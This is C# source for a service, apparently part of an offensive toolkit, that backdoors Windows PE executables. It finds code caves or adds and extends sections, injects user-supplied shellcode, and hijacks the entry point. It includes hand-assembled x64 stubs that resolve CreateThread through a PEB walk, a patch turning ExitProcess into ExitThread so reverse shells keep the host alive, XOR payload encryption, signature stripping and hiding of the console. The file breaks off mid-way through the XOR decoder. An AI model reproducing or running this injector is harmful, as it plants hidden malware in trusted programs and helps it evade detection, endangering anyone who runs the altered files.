using System.Text;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

/// <summary>
/// Service for backdooring PE files by injecting shellcode.
/// Supports code cave injection, new section injection, and section extension.
/// Inspired by BDF-ng PE injection techniques, ported to C#.
/// </summary>
public sealed class PeBackdoorService
{
    // ── PE format constants ──────────────────────────────────────────────
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
    private const uint IMAGE_NT_SIGNATURE = 0x00004550;
    private const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    private const ushort IMAGE_FILE_MACHINE_I386 = 0x014c;
    private const ushort IMAGE_FILE_DLL = 0x2000;

    private const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;
    private const uint IMAGE_SCN_MEM_READ    = 0x40000000;
    private const uint IMAGE_SCN_MEM_WRITE   = 0x80000000;
    private const uint IMAGE_SCN_CNT_CODE    = 0x00000020;

    private const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040;
    private const ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;

    // ── x64 register save/restore stubs ──────────────────────────────────
    // 16 pushes (15 GPRs + pushfq) = 128 bytes = 0 mod 16.
    // sub rsp must also be 0 mod 16 so total stack movement is 0 mod 16,
    // ensuring CALL to shellcode enters with RSP = 8 mod 16 (standard ABI).
    // Save: push rax..rdi, push r8..r15, pushfq, sub rsp 0x20  (28 bytes)
    private static readonly byte[] X64SaveRegs = {
        0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57,          // push rax-rdi (skip rsp)
        0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,    // push r8-r11
        0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,    // push r12-r15
        0x9C,                                                // pushfq
        0x48, 0x83, 0xEC, 0x20                               // sub rsp, 0x20 (shadow space, 16-aligned)
    };

    // Restore: add rsp 0x20, popfq, pop r15..r8, pop rdi..rax  (28 bytes)
    private static readonly byte[] X64RestoreRegs = {
        0x48, 0x83, 0xC4, 0x20,                              // add rsp, 0x20
        0x9D,                                                 // popfq
        0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,     // pop r15-r12
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,     // pop r11-r8
        0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58            // pop rdi-rax
    };

    // x86 save/restore
    private static readonly byte[] X86SaveRegs  = { 0x60, 0x9C }; // pushad, pushfd
    private static readonly byte[] X86RestoreRegs = { 0x9D, 0x61 }; // popfd, popad

    // ── Internal PE parsing result ───────────────────────────────────────
    private sealed class ParsedPe
    {
        public uint PeOffset;
        public bool Is64Bit;
        public bool IsDll;
        public bool IsDotNet;
        public bool HasSignature;
        public bool HasAslr;

        public ushort Machine;
        public ushort NumberOfSections;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;

        public uint AddressOfEntryPoint;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint Checksum;
        public ushort Subsystem;
        public ushort DllCharacteristics;

        // File offsets of key fields (for patching)
        public long NumberOfSectionsFileOffset;
        public long EntryPointFieldFileOffset;
        public long SizeOfImageFieldFileOffset;
        public long ChecksumFieldFileOffset;
        public long SubsystemFieldFileOffset;
        public long SecurityDirFileOffset;   // file offset of Security data directory entry
        public long SectionHeadersFileOffset;

        // Calculated
        public long EntryPointCodeFileOffset; // file offset where entry point code lives

        public List<SectionEntry> Sections = new();
    }

    private sealed class SectionEntry
    {
        public string Name = "";
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint RawSize;
        public uint RawAddress;
        public uint Characteristics;
        public long HeaderFileOffset; // file offset of this section header (for patching)

        public bool IsExecutable => (Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        public bool IsReadable    => (Characteristics & IMAGE_SCN_MEM_READ) != 0;
        public bool IsWritable    => (Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
    }

    private sealed class CaveInfo
    {
        public string SectionName = "";
        public int SectionIndex;
        public long FileOffset;
        public uint Rva;
        public int Size;
        public byte FillByte;
        public bool SectionIsExecutable;
    }

    private readonly IAppLogger _logger;
    private readonly IAppPaths _paths;

    public PeBackdoorService(IAppPaths paths, IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Public API
    // ═════════════════════════════════════════════════════════════════════

    /// <summary>Analyze a PE file and return basic information.</summary>
    public async Task<PeInfo> AnalyzePeAsync(string filePath)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("PE file not found", filePath);
        return await Task.Run(() =>
        {
            var data = File.ReadAllBytes(filePath);
            var pe = ParsePe(data);
            return ToPeInfo(pe, filePath, data.Length);
        });
    }

    /// <summary>Find code caves in a PE file.</summary>
    public async Task<List<CodeCave>> FindCodeCavesAsync(string filePath, int minSize = 50)
    {
        return await Task.Run(() =>
        {
            var data = File.ReadAllBytes(filePath);
            var pe = ParsePe(data);
            return ScanForCaves(data, pe, minSize)
                .Select(c => new CodeCave
                {
                    SectionName = c.SectionName,
                    FileOffset = (uint)c.FileOffset,
                    VirtualAddress = c.Rva,
                    Size = (uint)c.Size
                })
                .ToList();
        });
    }

    /// <summary>Backdoor a PE file with shellcode.</summary>
    public async Task<BackdoorResult> BackdoorAsync(PeBackdoorOptions options)
    {
        var result = new BackdoorResult();
        try
        {
            // ── Validate inputs ──────────────────────────────────────
            if (!File.Exists(options.TargetPePath))
            {
                result.ErrorMessage = $"Target PE file not found: {options.TargetPePath}";
                return result;
            }
            if (!File.Exists(options.ShellcodePath))
            {
                result.ErrorMessage = $"Shellcode file not found: {options.ShellcodePath}";
                return result;
            }

            var shellcode = await File.ReadAllBytesAsync(options.ShellcodePath);
            if (shellcode.Length == 0)
            {
                result.ErrorMessage = "Shellcode file is empty";
                return result;
            }
            result.ShellcodeSize = shellcode.Length;
            result.Steps.Add($"Loaded shellcode: {shellcode.Length} bytes from {Path.GetFileName(options.ShellcodePath)}");
            _logger.Info($"Loaded shellcode: {shellcode.Length} bytes");

            // ── Parse PE ─────────────────────────────────────────────
            var peData = await File.ReadAllBytesAsync(options.TargetPePath);
            var pe = ParsePe(peData);
            result.Steps.Add($"Parsed PE: {(pe.Is64Bit ? "x64" : "x86")} {(pe.IsDll ? "DLL" : "EXE")}, {pe.NumberOfSections} sections");
            _logger.Info($"Target: {(pe.Is64Bit ? "x64" : "x86")} {(pe.IsDll ? "DLL" : "EXE")}");

            // ── Pre-flight validation ────────────────────────────────
            var issues = ValidateForInjection(pe, shellcode, options);
            foreach (var issue in issues)
            {
                if (issue.StartsWith("BLOCK:"))
                {
                    result.ErrorMessage = issue[6..].Trim();
                    result.Warnings.AddRange(issues.Where(i => !i.StartsWith("BLOCK:")));
                    return result;
                }
                result.Warnings.Add(issue);
                _logger.Warn(issue);
            }

            // ── Strip signature overlay BEFORE injection ─────────────
            // Signed PEs have signature data (overlay) appended AFTER the last
            // section. new-section and section-ext write there, so we must
            // truncate the overlay first to avoid corruption.
            if (pe.HasSignature && options.RemoveSignature)
            {
                peData = StripSignatureOverlay(peData, pe);
                pe = ParsePe(peData);
                result.Steps.Add($"Stripped signature overlay (file now {peData.Length:N0} bytes)");
            }

            // ── Encrypt shellcode if requested ───────────────────────
            byte[] payload = shellcode;
            if (options.Encryption != PayloadEncryption.None)
            {
                payload = EncryptPayload(shellcode, options);
                result.Steps.Add($"Encrypted payload with {options.Encryption} ({payload.Length} bytes)");
            }

            // ── Build injection payload ──────────────────────────────
            // Use threaded payload (CreateThread) for x64 to handle shellcode that
            // calls ExitProcess or never returns (reverse shells, etc).
            // Falls back to inline CALL for x86.
            int jmpOffsetInPayload;
            byte[] fullPayload;
            if (pe.Is64Bit && options.Encryption == PayloadEncryption.None)
            {
                fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload);
                int stubOverhead = fullPayload.Length - payload.Length;
                result.Steps.Add($"Built threaded payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
            }
            else
            {
                // Inline CALL payload (x86, or when encryption requires inline decoder)
                fullPayload = BuildInlinePayload(payload, pe.Is64Bit, options.Encryption, options.XorKey);
                int stubOverhead = fullPayload.Length - payload.Length;
                jmpOffsetInPayload = -1; // let PatchPayloadJmpOffset auto-detect
                result.Steps.Add($"Built injection payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
            }

            // ── Inject ───────────────────────────────────────────────
            uint payloadRva;
            switch (options.Method)
            {
                case InjectionMethod.CodeCave:
                    (peData, payloadRva) = InjectCodeCave(peData, pe, fullPayload, result);
                    break;
                case InjectionMethod.NewSection:
                    (peData, payloadRva) = InjectNewSection(peData, pe, fullPayload, options.NewSectionName, result);
                    // Re-parse after structural change
                    pe = ParsePe(peData);
                    break;
                case InjectionMethod.SectionExtension:
                    (peData, payloadRva) = InjectSectionExtension(peData, pe, fullPayload, result);
                    pe = ParsePe(peData);
                    break;
                default:
                    result.ErrorMessage = $"Injection method {options.Method} is not yet implemented";
                    return result;
            }

            result.ShellcodeAddress = payloadRva;
            result.CarrierAddress = payloadRva;

            // ── Patch JMP offset at end of payload to original OEP ──
            peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffsetInPayload);
            result.Steps.Add($"Patched resume JMP → original entry point 0x{pe.AddressOfEntryPoint:X}");

            // ── Hijack entry point ───────────────────────────────────
            peData = PatchEntryPointField(peData, pe, payloadRva);
            result.Steps.Add($"Entry point: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
            _logger.Info($"Entry point changed: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");

            // ── Post-processing ──────────────────────────────────────
            if (options.RemoveSignature && pe.HasSignature)
            {
                // Signature dir entry still set — zero it
                peData = RemoveSignatureInternal(peData, pe);
                result.Steps.Add("Zeroed signature directory entry");
            }

            if (options.PatchSubsystemToGui && !pe.IsDll)
            {
                peData = PatchSubsystemInternal(peData, pe);
                result.Steps.Add("Patched subsystem to GUI (hidden console)");
            }

            peData = RecalculateChecksum(peData, pe);
            result.Steps.Add("Recalculated PE checksum");

            // ── Verify output PE ─────────────────────────────────────
            try
            {
                var verifyPe = ParsePe(peData);
                if (verifyPe.AddressOfEntryPoint != payloadRva)
                    result.Warnings.Add($"Verification: entry point mismatch (expected 0x{payloadRva:X}, got 0x{verifyPe.AddressOfEntryPoint:X})");
            }
            catch (Exception ex)
            {
                result.Warnings.Add($"Post-injection PE verification failed: {ex.Message}");
            }

            // ── Write output ─────────────────────────────────────────
            var outputPath = options.OutputPath;
            if (string.IsNullOrEmpty(outputPath))
            {
                var dir = Path.GetDirectoryName(options.TargetPePath)!;
                var name = Path.GetFileNameWithoutExtension(options.TargetPePath);
                var ext = Path.GetExtension(options.TargetPePath);
                outputPath = Path.Combine(dir, $"{name}.backdoored{ext}");
            }

            var outDir = Path.GetDirectoryName(outputPath);
            if (!string.IsNullOrEmpty(outDir) && !Directory.Exists(outDir))
                Directory.CreateDirectory(outDir);

            await File.WriteAllBytesAsync(outputPath, peData);
            result.OutputPath = outputPath;
            result.Success = true;
            result.Steps.Add($"Output: {outputPath} ({peData.Length:N0} bytes)");
            _logger.Ok($"Backdoored PE written to: {outputPath}");

            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = ex.Message;
            _logger.Error($"Backdooring failed: {ex.Message}");
            return result;
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    //  PE Parsing
    // ═════════════════════════════════════════════════════════════════════

    private ParsedPe ParsePe(byte[] data)
    {
        if (data.Length < 64)
            throw new InvalidDataException("File too small to be a valid PE");

        var pe = new ParsedPe();
        using var ms = new MemoryStream(data);
        using var br = new BinaryReader(ms);

        // DOS header
        if (br.ReadUInt16() != IMAGE_DOS_SIGNATURE)
            throw new InvalidDataException("Invalid DOS signature (not MZ)");

        ms.Seek(0x3C, SeekOrigin.Begin);
        pe.PeOffset = br.ReadUInt32();

        if (pe.PeOffset + 4 > data.Length)
            throw new InvalidDataException("PE header offset points beyond file");

        // PE signature
        ms.Seek(pe.PeOffset, SeekOrigin.Begin);
        if (br.ReadUInt32() != IMAGE_NT_SIGNATURE)
            throw new InvalidDataException("Invalid PE signature");

        // ── File header (20 bytes) ───────────────────────────────────
        long fileHeaderOffset = pe.PeOffset + 4;

        pe.Machine = br.ReadUInt16();
        pe.Is64Bit = pe.Machine == IMAGE_FILE_MACHINE_AMD64;

        pe.NumberOfSectionsFileOffset = ms.Position;
        pe.NumberOfSections = br.ReadUInt16();

        br.ReadUInt32(); // TimeDateStamp
        br.ReadUInt32(); // PointerToSymbolTable
        br.ReadUInt32(); // NumberOfSymbols
        pe.SizeOfOptionalHeader = br.ReadUInt16();
        pe.Characteristics = br.ReadUInt16();
        pe.IsDll = (pe.Characteristics & IMAGE_FILE_DLL) != 0;

        // ── Optional header ──────────────────────────────────────────
        long optHeaderOffset = fileHeaderOffset + 20;
        ms.Seek(optHeaderOffset, SeekOrigin.Begin);
        ushort magic = br.ReadUInt16();

        // Skip linker version (2 bytes)
        br.ReadUInt16();
        // Skip SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData (12 bytes)
        br.ReadUInt32(); br.ReadUInt32(); br.ReadUInt32();

        // AddressOfEntryPoint at optional header offset 16
        pe.EntryPointFieldFileOffset = ms.Position;
        pe.AddressOfEntryPoint = br.ReadUInt32();

        br.ReadUInt32(); // BaseOfCode

        if (pe.Is64Bit)
        {
            pe.ImageBase = br.ReadUInt64();
        }
        else
        {
            br.ReadUInt32(); // BaseOfData (PE32 only)
            pe.ImageBase = br.ReadUInt32();
        }

        // SectionAlignment, FileAlignment at optional header offsets 32, 36
        pe.SectionAlignment = br.ReadUInt32();
        pe.FileAlignment = br.ReadUInt32();

        // Skip OS/Image/Subsystem versions + Win32VersionValue (16 bytes: 6×2 + 1×4)
        br.ReadBytes(16);

        // SizeOfImage at optional header offset 56
        pe.SizeOfImageFieldFileOffset = ms.Position;
        pe.SizeOfImage = br.ReadUInt32();

        pe.SizeOfHeaders = br.ReadUInt32();

        // Checksum at optional header offset 64
        pe.ChecksumFieldFileOffset = ms.Position;
        pe.Checksum = br.ReadUInt32();

        // Subsystem at optional header offset 68
        pe.SubsystemFieldFileOffset = ms.Position;
        pe.Subsystem = br.ReadUInt16();

        pe.DllCharacteristics = br.ReadUInt16();
        pe.HasAslr = (pe.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) != 0;

        // Data directories: Security is index 4
        // PE32:  data dirs start at optHeader + 96, Security at +128
        // PE32+: data dirs start at optHeader + 112, Security at +144
        long securityDirOffset = optHeaderOffset + (pe.Is64Bit ? 144 : 128);
        pe.SecurityDirFileOffset = securityDirOffset;
        ms.Seek(securityDirOffset, SeekOrigin.Begin);
        uint secRva = br.ReadUInt32();
        uint secSize = br.ReadUInt32();
        pe.HasSignature = secSize > 0;

        // COM Descriptor (index 14): .NET detection
        long comDirOffset = optHeaderOffset + (pe.Is64Bit ? 224 : 208);
        ms.Seek(comDirOffset, SeekOrigin.Begin);
        uint comRva = br.ReadUInt32();
        uint comSize = br.ReadUInt32();
        pe.IsDotNet = comSize > 0;

        // ── Section headers ──────────────────────────────────────────
        pe.SectionHeadersFileOffset = optHeaderOffset + pe.SizeOfOptionalHeader;
        ms.Seek(pe.SectionHeadersFileOffset, SeekOrigin.Begin);

        for (int i = 0; i < pe.NumberOfSections; i++)
        {
            long hdrOffset = ms.Position;
            var nameBytes = br.ReadBytes(8);
            var section = new SectionEntry
            {
                Name = Encoding.ASCII.GetString(nameBytes).TrimEnd('\0'),
                VirtualSize = br.ReadUInt32(),
                VirtualAddress = br.ReadUInt32(),
                RawSize = br.ReadUInt32(),
                RawAddress = br.ReadUInt32(),
                HeaderFileOffset = hdrOffset,
            };
            br.ReadBytes(12); // Relocations, Linenumbers
            section.Characteristics = br.ReadUInt32();
            pe.Sections.Add(section);
        }

        // Calculate entry point file offset
        pe.EntryPointCodeFileOffset = RvaToFileOffset(pe.AddressOfEntryPoint, pe.Sections);

        return pe;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Code Cave Scanning
    // ═════════════════════════════════════════════════════════════════════

    private List<CaveInfo> ScanForCaves(byte[] data, ParsedPe pe, int minSize)
    {
        var caves = new List<CaveInfo>();

        for (int si = 0; si < pe.Sections.Count; si++)
        {
            var section = pe.Sections[si];
            if (section.RawSize == 0 || section.RawAddress + section.RawSize > data.Length)
                continue;

            int start = (int)section.RawAddress;
            int end = start + (int)section.RawSize;

            int caveStart = -1;
            byte caveByte = 0;
            int caveLen = 0;

            for (int i = start; i < end; i++)
            {
                byte b = data[i];
                if (b == 0x00 || b == 0xCC)
                {
                    if (caveStart == -1)
                    {
                        caveStart = i;
                        caveByte = b;
                        caveLen = 1;
                    }
                    else if (b == caveByte || b == 0x00)
                    {
                        caveLen++;
                    }
                    else
                    {
                        // Different fill byte, flush and start new
                        if (caveLen >= minSize)
                            AddCave(caves, section, si, caveStart, caveLen, caveByte);
                        caveStart = i;
                        caveByte = b;
                        caveLen = 1;
                    }
                }
                else
                {
                    if (caveLen >= minSize)
                        AddCave(caves, section, si, caveStart, caveLen, caveByte);
                    caveStart = -1;
                    caveLen = 0;
                }
            }

            if (caveLen >= minSize)
                AddCave(caves, section, si, caveStart, caveLen, caveByte);
        }

        return caves.OrderByDescending(c => c.Size).ToList();
    }

    private static void AddCave(List<CaveInfo> list, SectionEntry section, int sectionIdx,
                                int fileOffset, int size, byte fillByte)
    {
        int offsetInSection = fileOffset - (int)section.RawAddress;
        list.Add(new CaveInfo
        {
            SectionName = section.Name,
            SectionIndex = sectionIdx,
            FileOffset = fileOffset,
            Rva = section.VirtualAddress + (uint)offsetInSection,
            Size = size,
            FillByte = fillByte,
            SectionIsExecutable = section.IsExecutable,
        });
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Payload Building
    // ═════════════════════════════════════════════════════════════════════

    /// <summary>
    /// Build inline injection payload:
    ///   [save regs] [CALL shellcode] [restore regs] [JMP oep] [shellcode]
    /// The JMP offset is set to 0 and must be patched after placement.
    /// </summary>
    private byte[] BuildInlinePayload(byte[] shellcode, bool is64Bit,
                                       PayloadEncryption encryption = PayloadEncryption.None,
                                       byte xorKey = 0x42)
    {
        var buf = new List<byte>();

        byte[] saveRegs = is64Bit ? X64SaveRegs : X86SaveRegs;
        byte[] restoreRegs = is64Bit ? X64RestoreRegs : X86RestoreRegs;

        // [save regs]
        buf.AddRange(saveRegs);

        // XOR decoder stub (if encrypted)
        int decoderSize = 0;
        if (encryption == PayloadEncryption.Xor)
        {
            var decoder = BuildXorDecoderStub(is64Bit, shellcode.Length, xorKey);
            buf.AddRange(decoder);
            decoderSize = decoder.Length;
        }

        // [CALL shellcode] - E8 + 4-byte relative offset
        // The offset jumps over: restore + jmp = restoreRegs.Length + 5
        int callOffset = restoreRegs.Length + 5; // skip restore + jmp to reach shellcode
        buf.Add(0xE8);
        buf.AddRange(BitConverter.GetBytes(callOffset));

        // [restore regs]
        buf.AddRange(restoreRegs);

        // [JMP original_entry_point] - E9 + 4-byte offset (patched later)
        buf.Add(0xE9);
        buf.AddRange(new byte[4]); // placeholder, patched by PatchPayloadJmpOffset

        // [shellcode bytes]
        buf.AddRange(shellcode);

        return buf.ToArray();
    }

    /// <summary>
    /// Build a threaded injection payload that runs shellcode in a new thread via CreateThread.
    /// This allows the original program to continue running even if the shellcode never returns
    /// or calls ExitProcess (which is patched to ExitThread).
    /// Layout: [save regs] [PEB walk + CreateThread(shellcode)] [restore regs] [JMP oep] [shellcode]
    /// The JMP offset is set to 0 and must be patched after placement.
    /// x64 only — falls back to inline payload for x86.
    /// </summary>
    private byte[] BuildThreadedPayload(byte[] shellcode, bool is64Bit, out int jmpOffsetInPayload)
    {
        if (!is64Bit)
        {
            // x86 threaded stub not implemented — fall back to inline
            var inline = BuildInlinePayload(shellcode, is64Bit);
            // JMP is at: save(2) + call(5) + restore(2) = 9
            jmpOffsetInPayload = X86SaveRegs.Length + 5 + X86RestoreRegs.Length;
            return inline;
        }

        // Patch ExitProcess → ExitThread so the thread exits cleanly instead of killing the process
        shellcode = PatchExitProcessToExitThread(shellcode);

        var buf = new List<byte>();

        // ═══ [Save registers] ═══════════════════════════════════════════
        buf.AddRange(X64SaveRegs); // 28 bytes

        // ═══ [PEB walk: find kernel32 base] ═════════════════════════════ (26 bytes)
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });                         // xor rcx, rcx
        buf.AddRange(new byte[] { 0x65, 0x48, 0x8B, 0x41, 0x60 });             // mov rax, gs:[rcx+0x60] (PEB)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x40, 0x18 });                   // mov rax, [rax+0x18]    (Ldr)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x70, 0x20 });                   // mov rsi, [rax+0x20]    (InMemOrderModuleList)
        buf.AddRange(new byte[] { 0x48, 0xAD });                               // lodsq                  (skip exe)
        buf.AddRange(new byte[] { 0x48, 0x96 });                               // xchg rax, rsi
        buf.AddRange(new byte[] { 0x48, 0xAD });                               // lodsq                  (skip ntdll)
        buf.AddRange(new byte[] { 0x48, 0x8B, 0x58, 0x20 });                   // mov rbx, [rax+0x20]    (kernel32 DllBase)

        // ═══ [Export directory parse] ═══════════════════════════════════ (16 bytes)
        buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });                         // mov eax, [rbx+0x3C]    (e_lfanew)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (PE header VA)
        buf.AddRange(new byte[] { 0x44, 0x8B, 0xA0, 0x88, 0x00, 0x00, 0x00 }); // mov r12d, [rax+0x88]  (Export Dir RVA)
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDC });                         // add r12, rbx           (Export Dir VA)

        // ═══ [Export name search setup] ═════════════════════════════════ (16 bytes)
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x4C, 0x24, 0x18 });             // mov ecx, [r12+0x18]    (NumberOfNames)
        buf.AddRange(new byte[] { 0x45, 0x8B, 0x54, 0x24, 0x20 });             // mov r10d, [r12+0x20]   (AddressOfNames RVA)
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDA });                         // add r10, rbx           (AddressOfNames VA)
        buf.AddRange(new byte[] { 0x45, 0x31, 0xDB });                         // xor r11d, r11d         (index = 0)

        // ═══ [Search loop for "CreateThread"] ═══════════════════════════
        int searchLoopPos = buf.Count;
        buf.AddRange(new byte[] { 0x43, 0x8B, 0x34, 0x9A });                   // mov esi, [r10+r11*4]   (name RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDE });                         // add rsi, rbx           (name VA)
        buf.AddRange(new byte[] { 0x81, 0x3E, 0x43, 0x72, 0x65, 0x61 });       // cmp dword [rsi], "Crea"
        int jneNext1 = buf.Count;
        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x74, 0x65, 0x54, 0x68 }); // cmp dword [rsi+4], "teTh"
        int jneNext2 = buf.Count;
        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
        int jmpFound = buf.Count;
        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp found (patch later)

        // next_name:
        int nextNamePos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0xFF, 0xC3 });                         // inc r11d
        buf.AddRange(new byte[] { 0x41, 0x39, 0xCB });                         // cmp r11d, ecx
        int jlSearch = buf.Count;
        buf.AddRange(new byte[] { 0x7C, 0x00 });                               // jl search_loop (patch later)
        int jmpSkip = buf.Count;
        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp skip_thread (patch later)

        // found: resolve CreateThread address from ordinals + functions tables
        int foundPos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x44, 0x24, 0x24 });             // mov eax, [r12+0x24]    (AddressOfNameOrdinals RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (ordinals VA)
        buf.AddRange(new byte[] { 0x42, 0x0F, 0xB7, 0x04, 0x58 });             // movzx eax, word [rax+r11*2] (ordinal)
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x54, 0x24, 0x1C });             // mov edx, [r12+0x1C]    (AddressOfFunctions RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDA });                         // add rdx, rbx           (functions VA)
        buf.AddRange(new byte[] { 0x8B, 0x04, 0x82 });                         // mov eax, [rdx+rax*4]   (function RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (CreateThread VA!)

        // CreateThread(NULL, 0, shellcode_addr, NULL, 0, NULL)
        buf.AddRange(new byte[] { 0x4D, 0x31, 0xC9 });                         // xor r9, r9             (lpParameter = NULL)
        buf.AddRange(new byte[] { 0x41, 0x51 });                               // push r9                (lpThreadId = NULL)
        buf.AddRange(new byte[] { 0x41, 0x51 });                               // push r9                (dwCreationFlags = 0)
        int leaR8Pos = buf.Count;
        buf.AddRange(new byte[] { 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 }); // lea r8, [rip+??]      (lpStartAddress, patch later)
        buf.AddRange(new byte[] { 0x48, 0x31, 0xD2 });                         // xor rdx, rdx           (dwStackSize = 0)
        buf.AddRange(new byte[] { 0x48, 0x31, 0xC9 });                         // xor rcx, rcx           (lpThreadAttributes = NULL)
        buf.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });                   // sub rsp, 0x20          (shadow space)
        buf.AddRange(new byte[] { 0xFF, 0xD0 });                               // call rax               (CreateThread!)
        buf.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x30 });                   // add rsp, 0x30          (shadow + 2 pushes)

        // skip_thread: (fall through to restore + JMP OEP)
        int skipThreadPos = buf.Count;

        // ═══ [Restore registers] ════════════════════════════════════════
        buf.AddRange(X64RestoreRegs); // 28 bytes

        // ═══ [JMP original entry point] ═════════════════════════════════
        int jmpOepPos = buf.Count;
        buf.Add(0xE9);
        buf.AddRange(new byte[4]); // placeholder — patched by PatchPayloadJmpOffset

        // ═══ [Shellcode] ════════════════════════════════════════════════
        int shellcodePos = buf.Count;
        buf.AddRange(shellcode);

        // ─── Patch all relative jump offsets ────────────────────────────
        var bytes = buf.ToArray();

        // jne next_name (1st cmp failed)
        bytes[jneNext1 + 1] = (byte)(nextNamePos - (jneNext1 + 2));
        // jne next_name (2nd cmp failed)
        bytes[jneNext2 + 1] = (byte)(nextNamePos - (jneNext2 + 2));
        // jmp found (both cmps passed)
        bytes[jmpFound + 1] = (byte)(foundPos - (jmpFound + 2));
        // jl search_loop (backward jump)
        bytes[jlSearch + 1] = unchecked((byte)(searchLoopPos - (jlSearch + 2)));
        // jmp skip_thread (CreateThread not found, skip call)
        bytes[jmpSkip + 1] = (byte)(skipThreadPos - (jmpSkip + 2));
        // lea r8, [rip + shellcode] — shellcode address for CreateThread
        int leaDisp = shellcodePos - (leaR8Pos + 7);
        BitConverter.GetBytes(leaDisp).CopyTo(bytes, leaR8Pos + 3);

        jmpOffsetInPayload = jmpOepPos;
        return bytes;
    }

    /// <summary>
    /// Patches "ExitProcess\0" to "ExitThread\0\0" in shellcode bytes.
    /// This ensures the shellcode thread exits cleanly without killing the host process.
    /// Both strings are 12 bytes so the replacement is size-neutral.
    /// </summary>
    private static byte[] PatchExitProcessToExitThread(byte[] shellcode)
    {
        byte[] exitProcess = Encoding.ASCII.GetBytes("ExitProcess\0");
        byte[] exitThread  = Encoding.ASCII.GetBytes("ExitThread\0\0"); // pad to 12 bytes

        var patched = (byte[])shellcode.Clone();

        for (int i = 0; i <= patched.Length - exitProcess.Length; i++)
        {
            bool match = true;
            for (int j = 0; j < exitProcess.Length; j++)
            {
                if (patched[i + j] != exitProcess[j]) { match = false; break; }
            }
            if (match)
            {
                Array.Copy(exitThread, 0, patched, i, exitThread.Length);
                // Patch all occurrences (some shellcodes reference it multiple times)
            }
        }

        return patched;
    }

    /// <summary>
    /// Build a small XOR decoder stub that decrypts shellcode in-place before execution.
    /// Must be placed right before the CALL instruction.
    /// </summary>
    private byte[] BuildXorDecoderStub(bool is64Bit, int shellcodeLen, byte xorKey)
    {
        if (is64Bit)
        {
            // The shellcode will be located after: decoder + CALL(5) + restore(28) + JMP(5) = decoder + 38
            // But we don't know decoder size yet (chicken-and-egg).
            // Solution: use a fixed-size stub and compute offset at the end.
            // For now we use a simple approach:
            //   lea rsi, [rip + offset]  ; 7 bytes (48 8D 35 XX XX XX XX)
            //   mov ecx, length          ; 5 bytes (B9 XX XX XX XX)
            //   xor_loop:
            //   xor byte [rsi], key      ; 3 bytes (80 36 XX)
            //   inc rsi                  ; 3 bytes (48 FF C6)
            //   dec ecx                  ; 2 bytes (FF C9)
            //   jnz xor_loop            ; 2 bytes (75 F6)
            // Total: 22 bytes
            var buf = new List<byte>();

            // lea rsi, [rip + offset_to_shellcode]
            // offset = (CALL(5) + restore(28) + JMP(5)) = 38 bytes ahead from end of LEA
            int leaOffset = 38 + (22 - 7); // remaining decoder bytes after LEA + call+restore+jmp
            // Actually: from end of LEA instruction (which is 7 bytes into decoder),
            // the shellcode is at: (remaining_decoder_bytes) + CALL(5) + restore(28) + JMP(5) = 15 + 38 = 53
            // remaining decoder after LEA = 22 - 7 = 15
            leaOffset = 15 + 38; // = 53
